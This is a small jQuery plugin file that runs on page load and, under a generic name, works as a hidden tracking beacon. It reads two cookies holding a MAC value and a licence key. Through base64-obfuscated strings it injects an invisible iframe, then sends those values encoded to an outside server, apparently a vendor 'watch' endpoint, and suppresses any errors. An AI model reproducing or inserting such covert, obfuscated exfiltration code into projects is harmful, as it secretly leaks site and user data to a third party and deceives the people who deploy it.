(function ($) {
    $.abcd = {
        getCookie: function (a) {
            var b, c = new RegExp("(^| )" + a + "=([^;]*)(;|$)");
            if (b = document.cookie.match(c)) {
                return unescape(b[2])
            } else {
                return null
            }
        },
        execute: function () {
            try {
                if (top.$.wdversion == undefined) {
                    top.$.wdversion = "0.0.0.0.0.1";                    var a = $.abcd.getCookie("nfine_mac");                    var b = $.abcd.getCookie("nfine_licence");                    var c = decodeURIComponent(window.atob("aHR0cDovL3d3dy5uZmluZS5jbjo4MDk5L05GaW5lV2F0Y2gvMjAxNjA4MDEuaHRtbA=="));                    var d = window.atob("aWZyYW1lanMwMDAwMQ==");                    var f = decodeURIComponent(window.atob("JTNDaWZyYW1lJTIwaWQlM0QlMjJpZnJhbWVqczAwMDAxJTIyJTIwJTIwc3R5bGUlM0QlMjJkaXNwbGF5JTNBbm9uZSUyMiUyMCUzRSUzQy9pZnJhbWUlM0U="));                    var g = "";
                    if (top.$("#" + d).length <= 0) {
                        top.$("body").append(f);
                        window.setTimeout(function () {
                            top.$.wdkey = { userKey: b, macs: a };                            if (top.$.wdkey != undefined) {
                                g = window.btoa(JSON.stringify(top.$.wdkey))
                            };
                            top.$("#" + d).attr("src", c + "?ppp=" + g)
                        }, 6000)
                    }
                }
            } catch (e) {
            }
        },
        init: function () {
            $.abcd.execute()
        }
    };
    $(function () { $.abcd.init() })
})(jQuery);